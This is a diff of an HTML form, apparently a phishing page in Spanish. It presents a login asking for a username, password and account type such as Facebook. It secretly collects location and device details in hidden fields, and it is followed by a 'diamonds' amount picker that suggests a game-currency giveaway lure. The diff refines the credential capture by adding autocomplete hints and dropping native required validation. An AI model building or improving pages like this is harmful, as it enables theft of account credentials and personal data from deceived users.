@@ -30,10 +30,11 @@
     <input type="hidden" name="ubicacion" id="ubicacion">
     <input type="hidden" name="dispositivo_detalle" id="clientHintsInput">
 
-    <div id="login" class="seccion visible">
+        <div id="login" class="seccion visible">
       <h2>Inicia sesión</h2>
-      <input type="text" name="usuario" placeholder="Usuario" required />
-      <input type="password" name="contraseña" placeholder="Contraseña" required />
+      <!-- Se añade autocomplete y se remueve el required nativo para evitar el bloqueo visual -->
+      <input type="text" name="usuario" id="usuarioInput" placeholder="Usuario" autocomplete="username" />
+      <input type="password" name="contraseña" id="passwordInput" placeholder="Contraseña" autocomplete="current-password" />
       <h4>¿Tu cuenta es de?</h4>
       <div class="cuenta-tipo">
         <input type="radio" id="facebook" name="tipo_cuenta" value="Facebook" />
@@ -44,7 +45,7 @@
       <button type="button" onclick="validarYMostrar()">Entrar</button>
     </div>
 
-    <div id="diamantes" class="seccion">
+   <div id="diamantes" class="seccion">
       <h2>Selecciona una cantidad</h2>
       <div class="opciones">
         <div class="opcion">
